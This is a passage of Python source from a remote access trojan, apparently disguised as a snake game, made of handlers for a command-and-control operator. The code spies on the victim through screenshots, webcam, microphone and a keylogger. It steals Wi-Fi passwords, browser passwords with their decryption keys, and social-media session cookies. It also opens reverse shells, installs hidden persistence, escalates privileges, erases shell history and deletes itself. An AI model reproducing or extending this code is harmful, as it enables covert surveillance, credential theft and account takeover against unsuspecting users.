            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            # Send as loot
            filename = os.path.basename(filepath)
            success = self._send_loot('file', file_data, filename)
            
            return {
                'filename': filename,
                'size': len(file_data),
                'status': 'sent' if success else 'failed'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_upload(self, cmd):
        """Upload file to victim with directory auto-creation"""
        filename = cmd.get('filename', '')
        data_b64 = cmd.get('data', '')
        target_path = cmd.get('target_path')
        
        try:
            # 1. Resolve target path
            if not target_path:
                target_path = os.path.join(self.shell_cwd, filename)
            else:
                # Handle Windows paths correctly
                if IS_WINDOWS and (":" in target_path or target_path.startswith("\\\\")):
                    # Absolute Windows path
                    pass
                elif not os.path.isabs(target_path):
                    target_path = os.path.join(self.shell_cwd, target_path)
            
            # 2. If target is a directory, append the original filename
            if os.path.isdir(target_path) or target_path.endswith(("\\", "/")):
                os.makedirs(target_path, exist_ok=True)
                target_path = os.path.join(target_path, filename)
            else:
                # Ensure the parent directory exists
                parent = os.path.dirname(target_path)
                if parent:
                    os.makedirs(parent, exist_ok=True)
                
            data = base64.b64decode(data_b64)
            
            # 3. Write data
            with open(target_path, 'wb') as f:
                f.write(data)
            
            self.logger.success(f"File uploaded to: {target_path}")
            return {'success': True, 'path': target_path, 'size': len(data), 'is_admin': PrivilegeManager.is_admin()}
        except Exception as e:
            self.logger.error(f"Upload failed: {e}")
            return {'error': str(e)}
    
    def _handle_screenshot(self, cmd):
        """Take screenshot with fallbacks for Wayland/X11 errors"""
        try:
            # Set display for Linux if not set
            if IS_LINUX and 'DISPLAY' not in os.environ:
                os.environ['DISPLAY'] = ':0'
                
            img = None
            error_msgs = []
            
            # Method 1: mss (Fastest)
            try:
                import mss
                with mss.mss() as sct:
                    # Select monitor: 0 is all monitors, 1 is primary
                    mon = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                    screenshot = sct.grab(mon)
                    
                    # If monitor 1 is suspiciously small or 0x0, try monitor 0
                    if screenshot.width < 100 or screenshot.height < 100:
                        screenshot = sct.grab(sct.monitors[0])
                        
                    from PIL import Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    
                    # Last check on image size
                    if img.size[0] < 100 or img.size[1] < 100:
                        img = None
                        error_msgs.append("mss produced a suspiciously small image")
                    else:
                        self.logger.debug(f"Screenshot captured with mss (Size: {img.size})")
            except Exception as e:
                error_msgs.append(f"mss failed: {str(e)}")
            
            # Method 2: PIL ImageGrab (Second best)
            if img is None:
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    if img and (img.size[0] < 100 or img.size[1] < 100):
                        img = None
                        raise Exception("ImageGrab produced a suspiciously small image")
                    self.logger.debug(f"Screenshot captured with ImageGrab (Size: {img.size if img else 'N/A'})")
                except Exception as e:
                    error_msgs.append(f"ImageGrab failed: {str(e)}")
            
            # Method 3: Linux CLI fallbacks (Smart ordering)
            if img is None and IS_LINUX:
                # Prioritize grim if on Wayland, otherwise scrot/import
                session_type = os.environ.get('XDG_SESSION_TYPE', '').lower()
                tools = ['grim', 'scrot', 'import'] if session_type == 'wayland' else ['scrot', 'import', 'grim']
                
                for tool in tools:
                    try:
                        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                            tmp_name = tmp.name
                        
                        if tool == 'scrot':
                            subprocess.run(['scrot', '-o', tmp_name], capture_output=True, timeout=5)
                        elif tool == 'import':
                            subprocess.run(['import', '-window', 'root', tmp_name], capture_output=True, timeout=5)
                        elif tool == 'grim':
                            subprocess.run(['grim', tmp_name], capture_output=True, timeout=5)
                            
                        from PIL import Image
                        if os.path.exists(tmp_name) and os.path.getsize(tmp_name) > 100:
                            temp_img = Image.open(tmp_name)
                            if temp_img.size[0] >= 100 and temp_img.size[1] >= 100:
                                temp_img.load()
                                img = temp_img
                                os.unlink(tmp_name)
                                self.logger.debug(f"Screenshot captured with {tool} (Size: {img.size})")
                                break
                        if os.path.exists(tmp_name): os.unlink(tmp_name)
                    except Exception as e:
                        error_msgs.append(f"{tool} failed: {str(e)}")

            if img:
                # Resize if custom height requested
                target_h = int(cmd.get('height', 0))
                if target_h > 0 and target_h < img.size[1]:
                    scale = target_h / float(img.size[1])
                    new_w = int(img.size[0] * scale)
                    img = img.resize((new_w, target_h), Image.LANCZOS)

                # Compress
                img_byte_arr = io.BytesIO()
                img = img.convert('RGB')
                img.save(img_byte_arr, format='JPEG', quality=85)
                img_byte_arr = img_byte_arr.getvalue()
                
                # Send as loot
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                success = self._send_loot('screenshot', img_byte_arr, filename)
                
                return {
                    'filename': filename,
                    'size': len(img_byte_arr),
                    'dimensions': img.size,
                    'status': 'sent' if success else 'failed',
                    'method': 'fallback' if len(error_msgs) > 0 else 'primary'
                }
            else:
                return {'error': "All screenshot methods failed: " + " | ".join(error_msgs)}
        except Exception as e:
            return {'error': f"Screenshot system error: {str(e)}"}
    
    def _handle_webcam(self, cmd):
        """Capture from webcam with resolution support"""
        try:
            import cv2
            
            res_str = cmd.get('resolution', '640x480')
            try:
                target_w, target_h = map(int, res_str.lower().split('x'))
            except:
                target_w, target_h = 640, 480

            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) if IS_WINDOWS else cv2.VideoCapture(0)
            
            # Request custom resolution
            cap.set(cv2.CAP_PROP_FRAME_WIDTH,  target_w)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, target_h)

            for _ in range(60):
                cap.read()
                
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                # Resize if driver didn't honor request
                h, w = frame.shape[:2]
                if w != target_w or h != target_h:
                    frame = cv2.resize(frame, (target_w, target_h), interpolation=cv2.INTER_LINEAR)

                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                data = buffer.tobytes()
                
                filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                success = self._send_loot('webcam', data, filename)
                
                return {
                    'filename': filename, 'size': len(data),
                    'dimensions': f"{target_w}x{target_h}",
                    'status': 'sent' if success else 'failed'
                }
            return {'error': 'Could not read from camera'}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_microphone(self, cmd):
        """Record microphone (cross-platform)"""
        duration = cmd.get('duration', 10)
        
        try:
            import pyaudio
            import wave
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # Convert to WAV
            with io.BytesIO() as wav_buffer:
                wf = wave.open(wav_buffer, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                wav_data = wav_buffer.getvalue()
            
            # Send as loot
            filename = f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            success = self._send_loot('microphone', wav_data, filename)
            
            return {
                'filename': filename,
                'duration': duration,
                'size': len(wav_data),
                'status': 'sent' if success else 'failed'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_keylog(self, cmd):
        """Remote control for the background keylogger"""
        action = cmd.get('action', 'dump')
        
        if action == 'start':
            if self.keylog_running:
                return {'status': 'already_running'}
            self._start_background_keylogger()
            return {'status': 'keylogger_started'}
            
        elif action == 'stop':
            if not self.keylog_running:
                return {'status': 'not_running'}
            success = self._stop_background_keylogger()
            return {'status': 'keylogger_stopped' if success else 'stop_failed'}
            
        elif action == 'duration':
            duration = cmd.get('duration', 10)
            # Ensure it's running
            if not self.keylog_running:
                self._start_background_keylogger()
                time.sleep(1)
            # Clear buffer, wait for keys, then dump
            self.keylog_buffer = [] 
            time.sleep(duration)
            action = 'dump' # Fall through to dump logic

        if action == 'dump':
            captured = "".join(self.keylog_buffer)
            self.keylog_buffer = [] # Clear after dump
            
            # Always send as loot
            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            self._send_loot('keylog', captured.encode(), filename)
            return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured)}
            
        elif action == 'status':
            return {
                'running': self.keylog_running,
                'buffer_size': len(self.keylog_buffer),
                'session_type': os.environ.get('XDG_SESSION_TYPE', 'unknown') if IS_LINUX else 'N/A'
            }
        
        elif action == 'clear':
            count = len(self.keylog_buffer)
            self.keylog_buffer = []
            return {'success': True, 'cleared_count': count}
        
        return {'error': f'Unknown action: {action}'}
    
    def _handle_persistence(self, cmd):
        """Install persistence and immediately launch the shadow process so the
        C2 connection survives even if this (original) instance is closed."""
        success, details = PersistenceManager.install_persistence()
        if success:
            try:
                shadow_path = PersistenceManager.get_shadow_path()
                if shadow_path and os.path.exists(shadow_path):
                    is_frozen = getattr(sys, 'frozen', False)
                    if IS_WINDOWS:
                        if is_frozen:
                            # Frozen exe: launch the copied exe directly — no interpreter needed
                            # DETACHED_PROCESS (0x8) | CREATE_NO_WINDOW (0x08000000)
                            subprocess.Popen(
                                [shadow_path],
                                creationflags=0x08000008,  # DETACHED + NO_WINDOW
                                close_fds=True,
                            )
                        else:
                            # Plain .py script: find pythonw.exe for stealth
                            exe = sys.executable
                            pythonw = os.path.join(os.path.dirname(exe), "pythonw.exe")
                            if os.path.exists(pythonw):
                                exe = pythonw
                            subprocess.Popen(
                                [exe, shadow_path],
                                creationflags=0x08000008,  # DETACHED + NO_WINDOW
                                close_fds=True,
                            )
                    else:
                        # Linux / macOS: use a completely detached session
                        subprocess.Popen(
                            [sys.executable, shadow_path],
                            start_new_session=True,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                        )
                    details.append("Shadow process launched — connection will survive parent exit")
            except Exception as e:
                details.append(f"Shadow launch warning: {e}")

        return {'success': success, 'details': details}


    def _handle_unpersist(self, cmd):
        """Remove persistence"""
        success, details = PersistenceManager.remove_persistence()
        return {'success': success, 'details': details}
    
    def _handle_process(self, cmd):
        """Process management (cross-platform)"""
        action = cmd.get('action', 'list')
        
        try:
            if action == 'list':
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
                    try:
                        processes.append(proc.info)
                    except:
                        pass
                return {'processes': processes[:100]}  # Limit to 100
            
            elif action == 'kill':
                pid = cmd.get('pid')
                try:
                    proc = psutil.Process(pid)
                    proc.terminate()
                    return {'success': True, 'pid': pid}
                except Exception as e:
                    return {'error': str(e)}
            
            return {'error': 'Unknown action'}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_write_file(self, cmd):
        """Write content to a file (robust path handling)"""
        path = cmd.get('path')
        content = cmd.get('content', '')
        
        if not path:
            return {'error': 'Path required'}
            
        try:
            # Handle absolute/relative paths
            if not os.path.isabs(path):
                path = os.path.join(self.shell_cwd, path)
            
            # If path is a directory, we can't write content "to it" 
            if os.path.isdir(path):
                return {'error': f"Target '{path}' is a directory. Please specify a filename."}
                
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            return {'success': True, 'path': path, 'size': len(content)}
        except Exception as e:
            return {'error': str(e)}

    def _handle_file_browser(self, cmd):
        """File system browser (cross-platform)"""
        path = cmd.get('path', os.getcwd())
        
        try:
            items = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    items.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'modified': stat.st_mtime,
                        'permissions': oct(stat.st_mode)[-3:] if not IS_WINDOWS else '???'
                    })
                except:
                    continue
            
            return {
                'current_path': path,
                'parent': os.path.dirname(path),
                'items': items
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_port_scan(self, cmd):
        """Port scanner (cross-platform)"""
        target = cmd.get('target', '127.0.0.1')
        ports = cmd.get('ports', '1-1024')
        
        try:
            # Parse ports
            if '-' in ports:
                start, end = map(int, ports.split('-'))
                port_list = range(start, min(end + 1, 65536))
            else:
                port_list = [int(ports)]
            
            open_ports = []
            
            # Limit to 100 ports to avoid hanging
            port_list = list(port_list)[:100]
            
            for port in port_list:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        # Try to get service banner
                        try:
                            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                            banner = sock.recv(1024).decode().strip()[:50]
                        except:
                            banner = ''
                        
                        open_ports.append({
                            'port': port,
                            'banner': banner
                        })
                    sock.close()
                except:
                    continue
            
            return {
                'target': target,
                'open_ports': open_ports,
                'count': len(open_ports)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_system_info(self, cmd):
        """Get comprehensive system info"""
        return self.profiler.get_system_info()
    
    def _handle_reverse_shell(self, cmd):
        """Spawn reverse shell (cross-platform)"""
        host = cmd.get('host', '')
        port = cmd.get('port', 4445)
        
        if not host:
            return {'error': 'Host required'}
        
        try:
            if IS_WINDOWS:
                # Windows reverse shell using PowerShell (Metasploit Compatible)
                ps_script = f'''
$c = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{{0}};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS > ";
    $sbb = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbb,0,$sbb.Length);
    $s.Flush()
}};
$c.Close()
'''
                subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script])
            elif IS_LINUX or IS_MAC:
                # Python native reverse shell (More reliable/Metasploit compatible than bash -i)
                code = f"""
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{host}",{port}));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("/bin/sh")
                """
                subprocess.Popen([sys.executable, '-c', code])
            
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_clean_traces(self, cmd):
        """Clean evidence (cross-platform)"""
        try:
            if IS_WINDOWS:
                # Clear PowerShell history
                ps_history = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
                if os.path.exists(ps_history):
                    os.remove(ps_history)
                
                # Clear recent files
                recent = os.path.expanduser('~\\Recent')
                if os.path.exists(recent):
                    for f in os.listdir(recent)[:10]:  # Limit to 10 files
                        try:
                            os.remove(os.path.join(recent, f))
                        except:
                            pass
            
            elif IS_LINUX:
                # Clear bash history
                bash_history = os.path.expanduser('~/.bash_history')
                if os.path.exists(bash_history):
                    os.remove(bash_history)
                
                # Clear zsh history
                zsh_history = os.path.expanduser('~/.zsh_history')
                if os.path.exists(zsh_history):
                    os.remove(zsh_history)
            
            elif IS_MAC:
                # Clear zsh history on macOS
                zsh_history = os.path.expanduser('~/.zsh_history')
                if os.path.exists(zsh_history):
                    os.remove(zsh_history)
            
            # Clear Python history if exists
            py_history = os.path.expanduser('~/.python_history')
            if os.path.exists(py_history):
                os.remove(py_history)
            
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_open_url(self, cmd):
        """Open a URL in the default browser"""
        url = cmd.get('url', '')
        if not url:
            return {'error': 'URL required'}
            
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        try:
            webbrowser.open(url)
            self.logger.success(f"Redirected user to: {url}")
            return {'success': True, 'url': url}
        except Exception as e:
            return {'error': str(e)}

    def _handle_message_box(self, cmd):
        """Show a message box (GUI)"""
        text = cmd.get('text', 'Hello from SnakeGame!')
        title = cmd.get('title', 'System Message')
        try:
            if IS_WINDOWS:
                threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, title, 0)).start()
            elif IS_LINUX:
                # Try zenity or notify-send
                subprocess.Popen(['zenity', '--info', '--text', text, '--title', title], stderr=subprocess.DEVNULL)
                subprocess.Popen(['notify-send', title, text], stderr=subprocess.DEVNULL)
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_clipboard(self, cmd):
        """Get or Set clipboard content"""
        action = cmd.get('action', 'get')
        text = cmd.get('text', '')
        try:
            import pyperclip
            if action == 'set':
                pyperclip.copy(text)
                return {'success': True, 'action': 'set'}
            else:
                return {'success': True, 'action': 'get', 'content': pyperclip.paste()}
        except:
            # Fallback for Windows if pyperclip missing
            if IS_WINDOWS and action == 'get':
                try:
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    return {'success': True, 'content': data}
                except: pass
            return {'error': 'Clipboard module not available (pip install pyperclip)'}

    def _handle_wallpaper(self, cmd):
        """Change desktop wallpaper"""
        path = cmd.get('path', '')
        try:
            if IS_WINDOWS:
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            elif IS_LINUX:
                subprocess.Popen(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{path}'])
                subprocess.Popen(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri-dark', f'file://{path}'])
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_power(self, cmd):
        """Lock, Shutdown, or Reboot"""
        action = cmd.get('action', 'lock')
        try:
            if action == 'lock':
                if IS_WINDOWS: ctypes.windll.user32.LockWorkStation()
                else: subprocess.Popen(['xdg-screensaver', 'lock'], stderr=subprocess.DEVNULL)
            elif action == 'shutdown':
                if IS_WINDOWS: os.system('shutdown /s /t 1')
                else: os.system('shutdown now')
            elif action == 'reboot':
                if IS_WINDOWS: os.system('shutdown /r /t 1')
                else: os.system('reboot')
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_wifi_passwords(self, cmd):
        """Extract saved WIFI passwords (Powerful cross-platform)"""
        try:
            results = []
            if IS_WINDOWS:
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True).decode('utf-8', errors="ignore")
                profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
                for i in profiles:
                    try:
                        results_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], shell=True).decode('utf-8', errors="ignore")
                        password = [b.split(":")[1][1:-1] for b in results_data.split('\n') if "Key Content" in b]
                        results.append({'ssid': i, 'password': password[0] if password else ""})
                    except: pass
            elif IS_LINUX:
                # Try reading NetworkManager files directly (if root)
                if PrivilegeManager.is_admin():
                    nm_path = '/etc/NetworkManager/system-connections/'
                    if os.path.exists(nm_path):
                        for f in os.listdir(nm_path):
                            try:
                                with open(os.path.join(nm_path, f), 'r') as conn:
                                    content = conn.read()
                                    import re
                                    ssid = re.search(r'ssid=(.*)', content)
                                    psk = re.search(r'psk=(.*)', content)
                                    if ssid: results.append({'ssid': ssid.group(1), 'password': psk.group(1) if psk else "[No PSK]"})
                            except: pass
                # Fallback to nmcli
                if not results:
                    try:
                        data = subprocess.check_output(['nmcli', '-s', '-g', 'NAME,TYPE', 'connection', 'show'], shell=True).decode()
                        for line in data.split('\n'):
                            if '802-11-wireless' in line:
                                ssid = line.split(':')[0]
                                try:
                                    psk_data = subprocess.check_output(f'nmcli -s -g 802-11-wireless-security.psk connection show "{ssid}"', shell=True).decode().strip()
                                    results.append({'ssid': ssid, 'password': psk_data})
                                except: pass
                    except: pass
            return {'success': True, 'wifi_data': results}
        except Exception as e:
            return {'error': str(e)}

    def _handle_browser_passwords(self, cmd):
        """Dump saved browser passwords and decryption keys for offline analysis"""
        try:
            data = BrowserManager.get_passwords()
            passwords = data.get('passwords', [])
            keys = data.get('keys', {})
            
            if not passwords:
                return {'success': True, 'message': 'No passwords found or browsers not detected', 'count': 0}

            # Prepare report including keys
            report_data = {
                'metadata': {
                    'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'system': platform.node(),
                    'user': getpass.getuser(),
                    'decryption_keys': keys
                },
                'credentials': passwords
            }

            report_json = json.dumps(report_data, indent=2)
            filename = f"browser_loot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            # Encrypted hashes are sensitive and can be large, always send as loot if requested or > 10 entries
            submit_as_loot = cmd.get('as_file', True) or len(passwords) > 10
            
            if submit_as_loot:
                self._send_loot('passwords', report_json.encode(), filename)
                return {
                    'success': True,
                    'status': 'sent_as_loot',
                    'filename': filename,
                    'count': len(passwords),
                    'keys_found': len(keys) > 0
                }

            return {
                'success': True,
                'data': report_data,
                'count': len(passwords)
            }
        except Exception as e:
            return {'error': str(e)}

    def _handle_browser_cookies(self, cmd):
        """Extract browser cookies, optionally filtered by URL/domain"""
        try:
            url_filter = cmd.get('url', '')
            is_live = cmd.get('live', False)
            
            if is_live:
                # 1. Main OS Browser Warmup (Refreshes sessions/anti-bot state in user's active environment)
                try:
                    target_url = url_filter if url_filter.startswith("http") else f"https://{url_filter}"
                    webbrowser.open(target_url)
                    time.sleep(5) # Give the native browser a moment to settle/set cookies
                except:
                    pass

                # 2. Surgical Disk Harvest (to get App-Bound/v20 cookies like 'sessionid')
                disk_data = BrowserManager.get_cookies(url_filter)
                disk_cookies = disk_data.get('cookies', [])
                
                # 2. Live State Capture (to get dynamic/ephemeral tokens)
                res = BrowserManager.get_live_cookies(url_filter if url_filter.startswith("http") else f"https://{url_filter}")
                if 'error' in res: return res
                live_cookies = res.get('cookies', [])
                
                # 3. Intelligent Merge: Preserves the most 'live' versions but fills gaps from disk
                # (Especially important for Instagram/FB where 'sessionid' is App-Bound)
                live_keys = set()
                for c in live_cookies:
                    if isinstance(c, dict):
                        # CDP cookies use 'domain', Disk uses 'domain' too (after my update)
                        live_keys.add((c.get('name'), c.get('domain')))
                
                final_cookies = live_cookies[:]
                for dc in disk_cookies:
                    if not isinstance(dc, dict): continue
                    d_name = dc.get('name')
                    d_host = dc.get('domain')
                    if (d_name, d_host) not in live_keys:
                        # Convert Disk schema to aligned CDP format
                        final_cookies.append({
                            'name': d_name,
                            'value': dc.get('value', ''),
                            'domain': d_host,
                            'path': dc.get('path', '/'),
                            'expirationDate': dc.get('expirationDate', 0),
                            'httpOnly': dc.get('httpOnly', True),
                            'secure': dc.get('secure', True),
                            'sameSite': dc.get('sameSite', 'no_restriction'),
                            'hostOnly': dc.get('hostOnly', False),
                            'session': dc.get('session', False),
                            'storeId': dc.get('storeId', '0'),
                            'source': 'disk_sync'
                        })
                
                cookies = final_cookies
                keys = disk_data.get('keys', [])
                status = 'live_hybrid'
            else:
                data = BrowserManager.get_cookies(url_filter)
                cookies = data.get('cookies', [])
                keys = data.get('keys', [])
                status = 'disk'
            
            if not cookies and status != 'live':
                return {'success': True, 'message': 'No cookies found matching filter', 'count': 0}

            # Post-process: strip cookies with error-placeholder values (unreadable disk cookies)
            ERROR_PREFIXES = ('[DPAPI', '[InvalidTag', '[General Error', '[No Master', '[ENCRYPTED')
            clean_cookies = []
            failed_cookies = []
            for c in cookies:
                val = c.get('value', '') or ''
                if val.startswith(ERROR_PREFIXES):
                    failed_cookies.append(c)
                else:
                    clean_cookies.append(c)

            # Surface session-critical cookies for quick operator review
            TARGET_NAMES = {'sessionid', 'csrftoken', 'ds_user_id', 'rur', 'mid', 'ig_did',
                            'datr', 'c_user', 'xs', 'fr', 'wd',  # Facebook
                            'SAPISID', 'SID', '__Secure-3PSID',   # Google
                            'auth_token', 'ct0', 'twid',           # Twitter/X
                            'access_token', 'refresh_token'}       # Generic OAuth
            session_cookies = [
                {'name': c.get('name'), 'value': c.get('value'), 'domain': c.get('domain')}
                for c in clean_cookies if c.get('name') in TARGET_NAMES
            ]

            report_data = {
                'metadata': {
                    'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'system': platform.node(),
                    'user': getpass.getuser(),
                    'url_filter': url_filter,
                    'extraction_mode': status,
                    'decryption_keys': keys,
                    'session_cookies': session_cookies,   # <<< quick-access for sessionid etc.
                    'total_raw': len(cookies),
                    'total_clean': len(clean_cookies),
                    'total_failed_decrypt': len(failed_cookies)
                },
                'cookies': clean_cookies
            }

            report_json = json.dumps(report_data, indent=2)
            safe_filter = url_filter.replace('.', '_').replace('/', '_').replace(':', '') if url_filter else 'all'
            filename = f"cookies_{status}_{safe_filter}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            submit_as_loot = cmd.get('as_file', True) or len(clean_cookies) > 20
            
            if submit_as_loot:
                self._send_loot('cookies', report_json.encode(), filename)
                return {
                    'success': True,
                    'status': 'sent_as_loot',
                    'extraction_mode': status,
                    'filename': filename,
                    'count': len(clean_cookies),
                    'session_cookies': session_cookies  # surfaced in C2 result immediately
                }

            return {
                'success': True,
                'data': report_data,
                'extraction_mode': status,
                'count': len(clean_cookies),
                'session_cookies': session_cookies
            }
        except Exception as e:
            return {'error': str(e)}

    def _handle_elevate(self, cmd):
        """Attempt to elevate privileges and respawn"""
        if PrivilegeManager.is_admin():
            return {'success': True, 'message': 'Already running as admin', 'is_admin': True}
            
        success, message = PrivilegeManager.elevate()
        if success:
            # Schedule the current process to exit so the admin instance can take the port
            # We wait 2 seconds to ensure the result is sent to C2
            def delayed_exit():
                time.sleep(2)
                self.running = False
                os._exit(0)
            
            threading.Thread(target=delayed_exit, daemon=True).start()
            return {'success': True, 'message': 'Admin process launched. Connection will restart.', 'is_admin': False}
        
        return {'success': False, 'message': message, 'is_admin': False}

    def _handle_unelevate(self, cmd):
        """Attempt to drop privileges"""
        success, message = PrivilegeManager.delevate()
        return {'success': success, 'message': message, 'is_admin': PrivilegeManager.is_admin()}

    def _handle_abort(self, cmd):
        """Abort a running task or process"""
        target = cmd.get('target', 'all') # ID or 'all' or 'type'
        aborted = []
        
        # 1. Check active processes (shell commands)
        with CommandExecutor.proc_lock:
            to_kill = []
            if target == 'all':
                to_kill = list(CommandExecutor.active_processes.keys())
            elif target in CommandExecutor.active_processes:
                to_kill = [target]
            
            for tid in to_kill:
                proc = CommandExecutor.active_processes[tid]
                try:
                    if IS_WINDOWS:
                        subprocess.call(['taskkill', '/F', '/T', '/PID', str(proc.pid)])
                    else:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    aborted.append(tid)
                except:
                    pass
        
        # 2. Check microphone/keylog specifically if requested
        if target == 'mic' or target == 'all':
             # Note: Mic is harder to 'stop' unless it checks a flag
             pass
             
        return {'success': True, 'aborted_tasks': aborted, 'message': f"Attempted to abort: {target}"}

    def _handle_self_destruct(self, cmd):
        """Self destruct the RAT"""
        try:
            # Clean traces first
            self._handle_clean_traces({})
            
            # Stop running
            self.running = False
            
            # Get script path
            script_path = os.path.abspath(__file__)
            
            if IS_WINDOWS:
                # Windows self-delete
                batch_content = f'''@echo off
timeout /t 2 /nobreak > nul
del /f /q "{sys.executable}"
del /f /q "{script_path}"
del /f /q "%~f0"'''
                
                batch_path = os.path.join(tempfile.gettempdir(), f'del_{random.randint(1000,9999)}.bat')
                with open(batch_path, 'w') as f:
                    f.write(batch_content)
                
                subprocess.Popen(['start', '/b', batch_path], shell=True)
            
            elif IS_LINUX or IS_MAC:
                # Linux/macOS self-delete
                script = f'''#!/bin/sh
sleep 2
rm -f "{sys.executable}"
rm -f "{script_path}"
rm -f "$0"'''
                
                script_path_del = f'/tmp/del_{random.randint(1000,9999)}.sh'
                with open(script_path_del, 'w') as f:
                    f.write(script)
                
                os.chmod(script_path_del, 0o755)
                subprocess.Popen([script_path_del])
            
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_socks_proxy(self, cmd):
        """Setup SOCKS proxy (cross-platform)"""
        action = cmd.get('action', 'start')
        port = cmd.get('port', 1080)
        
        if action == 'start':
            if self.socks_proxy and self.socks_proxy.running:
                return {'error': 'SOCKS proxy already running'}
            self.socks_proxy = SocksProxy(port=port)
            success, msg = self.socks_proxy.start()
            return {'success': success, 'message': msg}
        elif action == 'stop':
            if not self.socks_proxy:
                return {'error': 'SOCKS proxy not running'}
            success, msg = self.socks_proxy.stop()
            self.socks_proxy = None
            return {'success': success, 'message': msg}
        
        return {'error': 'Invalid action'}
    
    def _handle_service(self, cmd):
        """Service management (Windows SC / Linux systemctl)"""
        action = cmd.get('action', 'list') # list, start, stop, status
        service_name = cmd.get('name', '')
        
        try:
            if IS_WINDOWS:
                if action == 'list':
                    res = subprocess.run(['sc', 'query', 'type=', 'service', 'state=', 'all'], capture_output=True, text=True)
                    return {'stdout': res.stdout[:5000]} # Limit output
                elif action in ['start', 'stop', 'status']:
                    if not service_name: return {'error': 'Service name required'}
                    res = subprocess.run(['sc', action if action != 'status' else 'query', service_name], capture_output=True, text=True)
                    return {'stdout': res.stdout, 'stderr': res.stderr}
            
            elif IS_LINUX:
                if action == 'list':
                    res = subprocess.run(['systemctl', 'list-units', '--type=service', '--all'], capture_output=True, text=True)
                    return {'stdout': res.stdout[:5000]}
                elif action in ['start', 'stop', 'status']:
                    if not service_name: return {'error': 'Service name required'}
                    res = subprocess.run(['systemctl', action, service_name], capture_output=True, text=True)
                    return {'stdout': res.stdout, 'stderr': res.stderr}
            
            return {'error': 'Action not supported on this platform'}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_registry(self, cmd):
        """Registry operations (Windows Registry / Linux Config Emulation)"""
        action = cmd.get('action', 'read') # read, write, delete
